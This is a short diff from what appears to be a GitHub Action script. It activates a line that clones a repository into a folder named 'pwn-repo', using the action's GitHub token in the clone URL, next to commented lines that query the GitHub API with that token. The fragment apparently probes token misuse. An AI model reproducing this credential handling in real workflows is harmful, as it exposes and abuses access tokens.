@@ -27,7 +27,7 @@ curl -X PUT \
 
 execSync(str, { stdio: 'inherit' });*/
 
-//execSync(`git clone https://${process.env.INPUT_GITHUBTOKEN}:x-oauth-basic@github.com/mousefluff/terraform-cdk-action.git pwn-repo`, { stdio: 'inherit' });
+execSync(`git clone https://${process.env.INPUT_GITHUBTOKEN}:x-oauth-basic@github.com/mousefluff/terraform-cdk-action.git pwn-repo`, { stdio: 'inherit' });
 //console.log(execSync('ls -la pwn-repo').toString());
 
 //execSync(`curl -H "Authorization: token ${process.env.INPUT_GITHUBTOKEN}" https://api.github.com/user`, { stdio: 'inherit' });
